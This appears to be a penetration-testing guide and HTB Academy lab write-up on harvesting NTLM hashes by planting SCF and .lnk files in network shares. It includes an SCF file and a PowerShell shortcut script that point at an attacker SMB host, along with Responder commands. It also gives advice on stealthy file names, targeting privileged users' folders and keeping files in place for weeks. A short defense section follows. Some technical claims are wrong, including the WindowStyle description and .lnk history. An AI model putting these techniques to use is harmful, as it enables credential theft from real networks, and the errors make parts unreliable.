# 🛰️ User Interaction Attacks: Credential Harvesting Techniques

## 🔍 Overview of User Interaction Exploits

[!ABSTRACT]
User interaction attacks exploit human behavior and system trust relationships to capture credentials when technical privilege escalation methods are insufficient. This guide details how to use malicious file placement in network shares to trigger SMB authentication, leading to the capture of NTLM hashes.

---

## 🎮 Malicious SCF File Placement for Credential Capture

### SCF vs .lnk Files
[!INFO]
- **SCF (Shell Configuration)** files are legacy configuration files used by Windows Explorer. They can be placed in network shares to trigger automatic SMB authentication requests.
- **.lnk (Shortcut)** files, introduced with newer versions of Windows, serve a similar purpose but work more reliably on modern systems.

### SCF File Creation
[!SUCCESS]
1. Create an `@Inventory.scf` file with the following content:
```text
[Shell]
Command=2
IconFile=\\10.10.14.3\share\legit.ico
[Taskbar]
Command=ToggleDesktop
```
- Use `@` prefix to place files at the top of directory listings.
- Ensure the file blends in with existing network shares.

### File Placement Strategy
[!SUCCESS]
1. **File Naming:** Choose names that resemble legitimate system or organizational documents (e.g., `Inventory.scf`, `Updates.lnk`).
2. **Directory Selection:** Place files in frequently accessed shares such as project folders, document repositories, and user desktops.
3. **Consistency:** Use naming conventions similar to those of existing files.

## 🔗 Malicious .lnk File Attacks

### .lnk vs SCF Compatibility
[!INFO]
- **SCF** files are no longer reliable on Server 2019 or newer systems but work well for legacy versions.
- **.lnk** files, which use the Windows shell link protocol, are more versatile and work consistently across modern Windows environments.

### PowerShell .lnk Generation
[!SUCCESS]
```powershell
# Create a malicious .lnk file:
$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut("C:\legit.lnk")
$lnk.TargetPath = "\\<attackerIP>\@pwn.png"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "Browsing to the directory where this file is saved will trigger an auth request."
$lnk.HotKey = "Ctrl+Alt+O"
$lnk.Save()
```
### .lnk File Properties
[!SUCCESS]
- **TargetPath:** The network path pointing to a fake SMB share.
- **IconLocation:** Use default system icons for stealth.
- **WindowStyle:** Set to 1 (hidden) to avoid user interaction.

## 🎯 Malicious Hash Capture

### Responder Setup
[!SUCCESS]
```bash
# Start Responder on attacker machine:
sudo responder -wrf -v -I tun0
```
Wait 2-5 minutes for users to browse the share and trigger authentication requests. The NTLM hashes will be captured in real-time.

## 🎯 File Share Attack Strategy

### Target Selection
[!SUCCESS]
1. **High-value file shares:** Network drives, shared project folders, document repositories.
2. **User directories:** Desktops and documents of high-privilege users.

### Naming Conventions
[!SUCCESS]
- Use legitimate-sounding names (e.g., `@Inventory.scf`, `@Updates.lnk`).
- Match existing file naming patterns to blend in.

## 🔧 Alternative Hash Capture Tools

### Responder Alternatives
[!INFO]
- **Inveigh:** PowerShell-based tool for capturing NTLM hashes.
- **InveighZero:** .NET compiled version of Inveigh.

### Tool Comparison
[!INFO]
| Tool          | Language | Platform  |
| ------------- | -------- | --------- |
| Responder     | Python   | Linux, Windows |
| Inveigh       | PowerShell | Windows    |
| InveighZero   | .NET     | Windows    |

## 🎯 HTB Academy Lab Solution

### Lab Environment
[!INFO]
- **Access:** RDP to target with htb-student:HTB_@cademy_stdnt!
- **Objective:** Obtain cleartext credentials for SCCM_SVC user.

### Credential Extraction Methods
1. **Process Monitoring:** Track scheduled tasks executed by the service account.
2. **SCF/LNK Placement:** Place malicious files in frequently accessed SCCM shares.
3. **Traffic Capture:** Monitor network communications for credential exchanges.
4. **File Enumeration:** Search for configuration files containing service accounts.

### Practical Approach
[!SUCCESS]
```powershell
# 1. Start process monitoring:
while($true) {
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 2
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}

# 2. Place malicious files in accessible shares:
# Create @SCCM_Update.lnk pointing to attacker SMB

# 3. Start Responder on attack machine:
sudo responder -wrf -v -I tun0

# 4. Wait for SCCM service account authentication
```

## 🔄 Advanced User Interaction Techniques

### Multi-Vector Approach
[!SUCCESS]
1. **Network Traffic Monitoring:** Passive method to capture credentials.
2. **Process Command Line Monitoring:** Active monitoring of command lines for embedded passwords.
3. **Malicious File Placement:** Use SCF and LNK files in network shares.
4. **Service Vulnerability Exploitation:** Target service-related vulnerabilities.
5. **Hash Capture & Cracking:** Post-exploitation technique to extract credentials.

### Persistence Considerations
[!SUCCESS]
- **Multiple Files:** Place several malicious files across different shares.
- **Long-term Monitoring:** Monitor for extended periods (days/weeks).
- **Target Diversity:** Focus on various user groups and roles.

## ⚠️ Detection & Defense

### Detection Indicators
[!WARNING]
- Unusual .scf/.lnk file creation in shares.
- SMB authentication to external IPs.
- Network traffic monitoring tool usage (Wireshark, tcpdump).
- Process command line monitoring scripts.

### Defensive Measures
[!SUCCESS]
1. **Restrict Npcap Driver:** Limit to administrators only.
2. **Monitor File Access Patterns:** Regularly review share activity logs.
3. **Block SMB External Networks:** Prevent unauthorized external SMB access.
4. **File Type Restrictions:** Implement on network shares.
5. **Security Awareness Training:** Educate users about social engineering threats.
6. **Network Segmentation:** Isolate critical systems from less secure environments.

## 💡 Key Takeaways

[!SUCCESS]
1. Users are often the weakest link in security chains.
2. Network traffic monitoring can reveal cleartext credentials.
3. Process command lines frequently contain embedded passwords.
4. SCF files trigger automatic SMB authentication (legacy systems).
5. Malicious .lnk files work on modern Windows versions.
6. File share placement strategy is critical for success.
7. Hash capture + offline cracking provides reliable credential theft.
8. Multiple attack vectors increase success probability.

---

This guide provides a comprehensive approach to using user interaction techniques for credential harvesting in network environments.